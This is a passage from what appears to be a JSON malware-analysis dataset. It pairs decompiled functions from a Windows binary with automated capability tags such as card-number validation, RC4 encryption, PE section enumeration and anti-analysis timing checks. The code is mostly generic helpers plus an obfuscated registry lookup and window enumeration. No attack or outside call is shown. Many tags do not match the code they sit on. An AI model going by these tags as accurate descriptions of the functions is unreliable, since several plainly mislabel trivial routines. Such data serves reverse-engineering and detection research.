        "decompiled_code": "\nchar * fcn.00419ecc(char *param_1, int32_t param_2)\n\n{\n    char *pcStack4;\n    \n    pcStack4 = param_1;\n    while( true ) {\n        if (*pcStack4 == param_2) {\n            return pcStack4;\n        }\n        if (*pcStack4 == '\\0') break;\n        pcStack4 = pcStack4 + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 97
    },
    "0041a18a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t fcn.0041a18a(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iStack4;\n    \n    iStack4 = 0;\n    while( true ) {\n        if (param_3 <= iStack4) {\n            return 0;\n        }\n        if (*(param_1 + iStack4) != *(param_2 + iStack4)) break;\n        iStack4 = iStack4 + 1;\n    }\n    return iStack4 + 1;\n}\n",
        "token_count": 123
    },
    "0041a53c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041a53c(char *param_1, char *param_2, int32_t param_3)\n\n{\n    char *pcStack8;\n    char *pcStack4;\n    \n    pcStack4 = param_1;\n    pcStack8 = param_2;\n    while( true ) {\n        if (param_3 == 0) {\n            return 0;\n        }\n        if (*pcStack4 != *pcStack8) break;\n        pcStack4 = pcStack4 + 1;\n        pcStack8 = pcStack8 + 1;\n        param_3 = param_3 + -1;\n    }\n    return *pcStack4 - *pcStack8;\n}\n",
        "token_count": 154
    },
    "0041a59f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a59f(int32_t param_1, uchar param_2, uint32_t param_3)\n\n{\n    uint32_t uStack4;\n    \n    for (uStack4 = 0; uStack4 < param_3; uStack4 = uStack4 + 1) {\n        *(param_1 + uStack4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0041a5e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a5e1(int32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t uStack4;\n    \n    for (uStack4 = 0; uStack4 < param_3; uStack4 = uStack4 + 1) {\n        *(param_1 + uStack4) = *(uStack4 + param_2);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0041b66a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b66a(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0041b0ec();\n    fcn.00419fa8(param_1, param_2, 0x420380, uVar1);\n    return;\n}\n",
        "token_count": 72
    },
    "0041b75b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b75b(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    fcn.0041a59f(param_1, 0, param_2);\n    uVar1 = fcn.0040b60e(\"-DraUDrj\\\\ajMPrX9qXTL\\\\MZ65dl\\\\PdR50Ci90WYd66W0\\\\y\");\n    fcn.00416b9d(0x80000002, uVar1, \"ProcessorNameString\", param_1, param_2);\n    return;\n}\n",
        "token_count": 133
    },
    "0041bc20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bc20(void)\n\n{\n    int32_t iStack4;\n    \n    for (iStack4 = 0; iStack4 < 0xff; iStack4 = iStack4 + 1) {\n        *(iStack4 * 4 + 0x4245e0) = 0;\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "0041bc7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0041bc7b(uint8_t param_1, uint param_2)\n\n{\n    fcn.0041bca8(param_1);\n    *(param_1 * 4 + 0x4245e0) = param_2;\n    return;\n}\n",
        "token_count": 62
    },
    "0041bca8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041bca8(uint8_t param_1)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.0041bc50(param_1);\n    if (cVar1 != '\\0') {\n        if (*(param_1 * 4 + 0x4245e0) != -0xf0f0f10) {\n            sub.msvcrt.dll_fclose(*(param_1 * 4 + 0x4245e0));\n        }\n        *(param_1 * 4 + 0x4245e0) = 0;\n    }\n    return;\n}\n",
        "token_count": 134
    },
    "0041c8b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0041c8b6(uint param_1, uint8_t *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint8_t auStack13 [13];\n    \n    auStack13[0] = *param_2;\n    cVar1 = fcn.0041bc50(auStack13[0]);\n    if (cVar1 != '\\0') {\n        iVar2 = sub.msvcrt.dll_fwrite(param_2 + 1, 1, param_3 + -1, *(auStack13[0] * 4 + 0x4245e0));\n        if (iVar2 == param_3 + -1) {\n            return;\n        }\n        fcn.0041bca8(auStack13[0]);\n    }\n    fcn.00408b8f(param_1, 0xad, auStack13, 1);\n    return;\n}\n",
        "token_count": 211
    },
    "0041cbf3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.0041cbf3(void)\n\n{\n    uint uVar1;\n    uint auStack32 [2];\n    uchar auStack24 [20];\n    uint uStack4;\n    \n    fcn.004195d4(auStack24, 0x8000);\n    sub.USER32.dll_EnumWindows(0x41cb00, auStack24);\n    uVar1 = fcn.00419910(auStack32);\n    fcn.00408b8f(uStack4, 0xc1, auStack32[0], uVar1);\n    fcn.00419639(auStack32);\n    return;\n}\n",
        "token_count": 140
    },
    "0041ccd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ccd5(uint param_1, uint param_2)\n\n{\n    sub.USER32.dll_SetWindowTextA(param_1, param_2);\n    return;\n}\n",
        "token_count": 40
    },
    "0041ce38": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041ce38(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uStack8;\n    \n    puVar2 = &stack0x00000004;\n    uVar1 = in_EAX;\n    if (0xfff < in_EAX) {\n        do {\n            puVar2 = puVar2 + -0x400;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack8 = in_EAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack8;\n}\n",
        "token_count": 173
    },
    "0040fec8": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data with MD5"
        ],
        "decompiled_code": "\nvoid fcn.0040fec8(uint *param_1)\n\n{\n    param_1[2] = 0x67452301;\n    param_1[3] = 0xefcdab89;\n    param_1[4] = 0x98badcfe;\n    param_1[5] = 0x10325476;\n    *param_1 = 0;\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 101
    }
}